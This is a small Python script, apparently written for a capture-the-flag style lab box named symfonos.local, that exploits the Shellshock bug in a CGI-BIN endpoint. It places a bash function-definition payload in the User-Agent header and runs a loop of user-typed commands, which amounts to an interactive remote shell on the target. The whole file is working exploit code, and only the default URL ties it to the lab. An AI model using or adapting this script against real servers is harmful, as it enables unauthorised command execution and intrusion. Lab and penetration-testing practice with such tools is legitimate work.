#!/usr/bin/env python3
#quick script to exploit the shellshock-vulnerability on symfonos.local. A virtual box to be hacked.

import requests, argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser("jml-shellshock.py")
	parser.add_argument("-U", type=str, help="The URL to the CGI-BIN. Quit with CTRL+C", default="http://symfonos.local/cgi-bin/underworld/", required="true")
	args = parser.parse_args()
	
	def main(url, command):
		response = requests.get(args.U, 
			headers = {"User-Agent": "() { ignored; }; echo; /bin/bash -c '%s'" % command}
		)
		if response.status_code == 200:
			if not response.text:
				print("[-] Command not found\n")
			else:
				return response.text
		else:
			print("[-] Connection can't handle the characters..\n")
	
	while True:
		try:
			payload = input("[+] What is your command?: ")
			result = main(args.U, payload)
			if result is not None:
				print(result)
		except KeyboardInterrupt:
			print("\nExiting..")
			break
		except requests.exceptions.RequestException as e:
			print(e)
			pass